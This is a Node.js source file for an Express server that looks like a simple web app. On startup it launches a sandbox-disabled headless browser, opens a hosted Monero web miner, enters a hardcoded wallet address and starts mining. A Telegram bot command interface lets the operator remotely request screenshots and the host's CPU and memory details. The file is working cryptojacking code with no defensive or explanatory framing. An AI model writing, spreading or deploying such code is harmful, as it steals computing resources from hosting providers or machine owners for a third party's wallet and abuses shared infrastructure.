const express = require("express");
const path = require("path");
const puppeteer = require("puppeteer");
const TelegramBot = require('node-telegram-bot-api');
const os = require('os');

const app = express();

// Telegram Bot setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

let page; 

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

(async () => {
  let browser;
  try {
    browser = await puppeteer.launch({ args: ["--no-sandbox"] });
    const pages = await browser.pages();
    page = pages[0]; // Assign the first page to the global variable page

    const url = "https://monero-webminer-main.onrender.com/";
    await page.goto(url, { waitUntil: "domcontentloaded" });
    await delay(2000);

    const inputSelector = '#AddrField';
    const WalletAddress = '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';

    await page.type(inputSelector, WalletAddress);
    await page.keyboard.press("Enter");
    await delay(2000);

    await page.click('#WebMinerBtn');

    console.log(await page.title()); // Log the page title for verification
  } catch (err) {
    console.error(err.message);
  } finally {
    // Optionally close the browser here if needed
    // await browser?.close();
  }
})();

// Function to take a screenshot
async function takeScreenshot() {
  if (!page) {
    throw new Error("Page is not initialized.");
  }

  const screenshotPath = 'screenshot.png';
  await page.screenshot({ path: screenshotPath });
  return screenshotPath;
}

async function sendSystemDetails(msg) {
  const totalMemory = os.totalmem();
  const freeMemory = os.freemem();
  const usedMemory = totalMemory - freeMemory;

  const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(2);

  const memoryMessage = `System Memory:\nTotal: ${toMB(totalMemory)} MB\nFree: ${toMB(freeMemory)} MB\nUsed: ${toMB(usedMemory)} MB`;

  const cpus = os.cpus();
  let cpuMessage = 'CPU Details:\n';
  cpus.forEach((cpu, index) => {
    cpuMessage += `CPU ${index + 1}:\n`;
    cpuMessage += `  Model: ${cpu.model}\n`;
    cpuMessage += `  Speed: ${cpu.speed} MHz\n`;
    cpuMessage += `  Times:\n`;
    cpuMessage += `    User: ${cpu.times.user} ms\n`;
    cpuMessage += `    Nice: ${cpu.times.nice} ms\n`;
    cpuMessage += `    Sys: ${cpu.times.sys} ms\n`;
    cpuMessage += `    Idle: ${cpu.times.idle} ms\n`;
    cpuMessage += `    IRQ: ${cpu.times.irq} ms\n\n`;
  });

  const message = memoryMessage + '\n' + cpuMessage;

  return message; 
}


// Command to trigger screenshot capture via Telegram Bot
bot.onText(/\/screenshot/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const screenshotPath = await takeScreenshot();
    bot.sendPhoto(chatId, screenshotPath);
  } catch (error) {
    console.error("Error taking screenshot:", error);
    bot.sendMessage(chatId, "An error occurred while taking the screenshot.");
  }
});

// Command to retrieve system details via Telegram Bot
bot.onText(/\/systemdetails/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const systemDetails = await sendSystemDetails(msg);
    bot.sendMessage(chatId, systemDetails);
  } catch (error) {
    console.error("Error retrieving system details:", error);
    bot.sendMessage(chatId, "An error occurred while retrieving system details.");
  }
}); 

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log(`Your app is listening on port ${listener.address().port}`);
});
